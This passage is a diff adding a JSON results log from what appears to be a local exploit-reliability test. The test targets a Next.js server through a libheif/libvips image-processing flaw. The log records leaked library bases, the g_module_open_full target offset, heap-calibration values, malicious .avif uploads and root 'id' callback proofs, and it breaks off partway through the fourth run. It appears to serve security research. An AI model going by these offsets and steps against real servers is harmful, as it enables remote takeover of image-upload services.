@@ -1,0 +1,2658 @@
+{
+  "profile_manifest": "/home/adrian/Targets/libheif/libheif-grid-nextjs-rce/profiles/native_stack_profiles_pie.json",
+  "expected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+  "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+  "node_binary": "fortbridge/libheif-grid-nextjs-rce:debian13:/usr/bin/node",
+  "node_sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e",
+  "node_identity_verified": true,
+  "docker_image": "fortbridge/libheif-grid-nextjs-rce:debian13",
+  "docker_image_id": "sha256:6430df3dc08728b5bbecfebb775acb205a5e4e1484ab0582775ecfbed0cee00e",
+  "remote_profile_selection": true,
+  "profile_restriction": null,
+  "leak_attempt_limit": 128,
+  "exploit_timeout_seconds": 90.0,
+  "target_port": 3216,
+  "callback_port_start": 31000,
+  "profile_manifest_sha256": "9fa2b95ecceb8ac70e955a0183de9265db7235a0ae7d8d0edf83ad9d50bc2633",
+  "node_profile": {
+    "elf_type": "ET_DYN",
+    "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+    "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+  },
+  "stock_environment": false,
+  "lifetimes": 10,
+  "successes": 10,
+  "success_rate": 1.0,
+  "correct_profile_selections": 10,
+  "unique_profile_selections": 10,
+  "distinct_libvips_bases": 10,
+  "distinct_control_target_addresses": 10,
+  "results": [
+    {
+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7fc0784b6000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7fc0784b6000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7fc07889f95e",
+        "derivation": "0x7fc0784b6000 + 0x3e995e = 0x7fc07889f95e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fc0786741b0",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xaf80",
+              "0xf900",
+              "0x1f8a0"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fc078679120",
+            "repetitions": 6,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xaf78",
+              "0xf8f8",
+              "0x119a8",
+              "0x12c08",
+              "0x1f898",
+              "0x23de8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fc078679130",
+            "repetitions": 6,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xaf88",
+              "0xf908",
+              "0x119b8",
+              "0x12c18",
+              "0x1f8a8",
+              "0x23df8"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fc0786949c0",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x149e8",
+              "0x27568"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7fc0784b6000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "a0082a326b94dc8a78151c7f98df51f969b203b67912ce17b364daa7aeb8fa57",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 15,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 15,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7fc0784b6000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fc0786741b0",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xaf80",
+              "0xf900",
+              "0x1f8a0"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fc078679120",
+            "repetitions": 6,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xaf78",
+              "0xf8f8",
+              "0x119a8",
+              "0x12c08",
+              "0x1f898",
+              "0x23de8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fc078679130",
+            "repetitions": 6,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xaf88",
+              "0xf908",
+              "0x119b8",
+              "0x12c18",
+              "0x1f8a8",
+              "0x23df8"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fc0786949c0",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x149e8",
+              "0x27568"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 4,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 5,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 6,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 7,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 8,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 9,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 10,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 11,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 12,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 13,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 14,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 15,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7fc0784b6000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-e028a98c08434abbb083f1cdd0894296.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 15,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-e028a98c08434abbb083f1cdd0894296.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 1,
+      "exploit_exit": 0,
+      "server_exit": 139
+    },
+    {
+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7fa0b0a74000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7fa0b0a74000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7fa0b0e5d95e",
+        "derivation": "0x7fa0b0a74000 + 0x3e995e = 0x7fa0b0e5d95e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fa0b0c321b0",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xc670",
+              "0xdb1e0"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fa0b0c37120",
+            "repetitions": 6,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x22b8",
+              "0xc668",
+              "0xd7128",
+              "0xdb1d8",
+              "0xe3ee8",
+              "0xeb7a8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fa0b0c37130",
+            "repetitions": 6,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x22c8",
+              "0xc678",
+              "0xd7138",
+              "0xdb1e8",
+              "0xe3ef8",
+              "0xeb7b8"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fa0b0c529c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xb528"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7fa0b0a74000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "4b0d39b605568496e05e814aed5b5363290702d3c0b4b5415b47b2a06620d7c6",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 7,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 7,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7fa0b0a74000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fa0b0c321b0",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xc670",
+              "0xdb1e0"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fa0b0c37120",
+            "repetitions": 6,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x22b8",
+              "0xc668",
+              "0xd7128",
+              "0xdb1d8",
+              "0xe3ee8",
+              "0xeb7a8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fa0b0c37130",
+            "repetitions": 6,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x22c8",
+              "0xc678",
+              "0xd7138",
+              "0xdb1e8",
+              "0xe3ef8",
+              "0xeb7b8"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fa0b0c529c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xb528"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 4,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 5,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 6,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 7,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7fa0b0a74000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-d5ac56412d4449cfb7f452f5d4940055.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 7,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-d5ac56412d4449cfb7f452f5d4940055.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 2,
+      "exploit_exit": 0,
+      "server_exit": 139
+    },
+    {
+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7fe5eedee000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7fe5eedee000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7fe5ef1d795e",
+        "derivation": "0x7fe5eedee000 + 0x3e995e = 0x7fe5ef1d795e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fe5eefac1b0",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2160",
+              "0x4720",
+              "0x9570",
+              "0xe17e0"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fe5eefb1120",
+            "repetitions": 8,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2158",
+              "0x4718",
+              "0x67c8",
+              "0x7998",
+              "0x9568",
+              "0x18848",
+              "0xe0c18",
+              "0xe17d8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fe5eefb1130",
+            "repetitions": 8,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2168",
+              "0x4728",
+              "0x67d8",
+              "0x79a8",
+              "0x9578",
+              "0x18858",
+              "0xe0c28",
+              "0xe17e8"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fe5eefcc9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xe1598"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7fe5eedee000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "2b0aae23b8de13713e8d6bb421a8f97953c840f3e52b13f944d1deae6a31e938",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 5,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 5,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7fe5eedee000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fe5eefac1b0",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2160",
+              "0x4720",
+              "0x9570",
+              "0xe17e0"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fe5eefb1120",
+            "repetitions": 8,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2158",
+              "0x4718",
+              "0x67c8",
+              "0x7998",
+              "0x9568",
+              "0x18848",
+              "0xe0c18",
+              "0xe17d8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fe5eefb1130",
+            "repetitions": 8,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2168",
+              "0x4728",
+              "0x67d8",
+              "0x79a8",
+              "0x9578",
+              "0x18858",
+              "0xe0c28",
+              "0xe17e8"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fe5eefcc9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xe1598"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 4,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 5,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7fe5eedee000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-6703f0f99bcb4a88be7acc8431882732.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 5,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-6703f0f99bcb4a88be7acc8431882732.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 3,
+      "exploit_exit": 0,
+      "server_exit": 139
+    },
+    {
+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7fa602dee000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7fa602dee000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7fa6031d795e",
+        "derivation": "0x7fa602dee000 + 0x3e995e = 0x7fa6031d795e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fa602fac1b0",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60",
+              "0x1aa50"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fa602fb1120",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068",
+              "0x1aa48"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fa602fb1130",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078",
+              "0x1aa58"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fa602fcc9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7fa602dee000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "454f7de103b16719120bfbb6bceda52e13a4d21f4f5b6e0cc6dd391b68b08b69",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 8,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 8,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7fa602dee000",
+        "selected_anchors": [
